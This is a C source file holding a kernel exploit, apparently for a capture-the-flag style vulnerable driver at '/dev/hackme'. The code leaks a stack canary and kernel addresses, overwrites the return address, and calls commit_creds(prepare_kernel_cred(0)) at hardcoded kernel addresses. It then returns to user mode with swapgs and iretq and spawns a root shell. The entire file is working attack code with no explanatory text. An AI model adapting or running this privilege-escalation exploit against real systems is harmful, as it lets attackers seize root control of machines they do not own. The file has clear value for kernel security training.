#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int fd;

unsigned long user_ss, user_rsp, user_rflags, user_cs;

void *prepare_kernel_cred = (void*)0xffffffff814c67f0ul;
void *commit_creds = (void*)0xffffffff814c6410ul;

void save_state(void) {
  asm volatile(
               "mov %cs, user_cs;"
               "mov %ss, user_ss;"
               "mov %rsp, user_rsp;"
               "pushfq; popq user_rflags;");
}

void init(void) {
  fd = open("/dev/hackme", O_RDWR);
  if (fd == -1) {
    puts("[!] error opening file");
    exit(-1);
  }

  save_state();
}

void hexdump(unsigned long *p, size_t n) {
  for (size_t i = 0; i < n; ++i) {
    printf("%03lu: %lx\n", i, p[i]);
  }
}

void shell(void) {
  system("/bin/sh");
}

void escalate_privs(void) {
  char *(*pkc)(int) = prepare_kernel_cred;
  void (*cc)(char*) = commit_creds;
  cc(pkc(0));
  asm volatile(
               "mov user_ss, %rax;"
               "movq %rax, 0x20(%rsp);"
               "mov user_rsp, %rax;"
               "movq %rax, 0x18(%rsp);"
               "mov user_rflags, %rax;"
               "movq %rax, 0x10(%rsp);"
               "mov user_cs, %rax;"
               "movq %rax, 0x8(%rsp);"
               "mov $shell+1, %rax;"
               "movq %rax, (%rsp);"
               "swapgs;"
               "iretq;"
               );
}

int main() {
  puts("[+] nyahallo");
  init();

  unsigned long leak[32];
  read(fd, leak, 32*sizeof(unsigned long));
  hexdump(leak, 32);

  unsigned long canary = leak[16];
  printf("canary: 0x%lx", canary);

  unsigned long kernel_leak = leak[10];
  printf("kernel_leak: 0x%lx", kernel_leak);

  memset(leak, 0x41, 32*sizeof(unsigned long));

  unsigned long *rop = leak+16;
  *rop++ = canary;
  *rop++ = 0xc0fe;
  *rop++ = 0xdead;
  *rop++ = 0xbeaf;
  *rop++ = (unsigned long)escalate_privs;

  write(fd, leak, sizeof(leak));

  
  puts("[!] exploit failed ;_;");
  return 0;
}
